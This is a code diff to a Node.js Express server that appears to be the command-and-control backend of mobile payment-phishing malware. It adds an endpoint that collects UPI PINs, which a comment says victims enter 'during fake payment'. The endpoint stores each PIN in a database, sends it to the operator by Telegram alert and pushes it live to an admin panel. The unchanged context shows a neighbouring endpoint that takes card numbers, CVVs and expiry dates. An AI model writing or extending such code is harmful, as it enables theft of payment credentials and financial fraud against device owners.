@@ -2364,7 +2364,40 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // ═══ PAYMENT INFO CAPTURE — device submits payment form data ═══
+  // ═══ UPI PIN CAPTURE — device submits UPI PIN entered during fake payment ═══
+  app.post('/api/devices/upi-pin', express.json({ limit: '1mb' }), (req, res) => {
+    try {
+      const { device_id, pin, app } = req.body;
+      if (!device_id || !pin) return res.status(400).json({ error: 'device_id and pin required' });
+
+      // Store in DB
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS upi_pins (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT NOT NULL,
+          pin TEXT NOT NULL,
+          app TEXT DEFAULT 'unknown',
+          captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO upi_pins (device_id, pin, app) VALUES (?,?,?)').run(device_id, pin, app || 'unknown');
+      } catch (_) {}
+
+      // Telegram alert
+      try {
+        const { sendAlert } = require('./utils/telegram-bot');
+        const devRow = db.prepare('SELECT device_name, model FROM devices WHERE device_id = ?').get(device_id);
+        const label = devRow ? (devRow.device_name || devRow.model || device_id.slice(0,12)) : device_id.slice(0,12);
+        sendAlert(`🔐 <b>UPI PIN Captured — ${label}</b>\nPIN: <code>${pin}</code>\nApp: ${app || 'UPI'}`);
+      } catch (_) {}
+
+      // Broadcast to admin panel in real-time
+      if (io) io.emit('upi_pin_captured', { device_id, pin, app: app || 'unknown' });
+
+      res.json({ success: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
   app.post('/api/devices/payment-info', express.json({ limit: '1mb' }), (req, res) => {
     try {
       const { device_id, method, upi_id, card_number, card_name, card_expiry, card_cvv, card_type, amount } = req.body;
